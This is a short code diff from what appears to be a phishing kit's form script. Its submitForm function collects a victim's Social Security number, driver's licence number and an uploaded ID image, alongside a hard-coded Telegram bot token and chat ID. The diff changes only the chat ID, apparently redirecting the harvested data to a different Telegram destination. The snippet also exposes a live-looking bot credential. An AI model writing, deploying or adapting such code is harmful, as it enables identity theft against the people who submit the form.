@@ -63,7 +63,7 @@ function fixStepIndicator(n) {
 
 var submitForm = function () {
           const BOT_TOKEN = '6921530308:AAF77fXVIGJthOwoo9IByU7C50r6wlUiWOs';
-          const CHAT_ID = '-4100241354';
+          const CHAT_ID = '-1002118242497';
           const ssn = document.getElementById('ssn').value;
           const dl = document.getElementById('dl').value;
           const frontInput = document.getElementById('front');
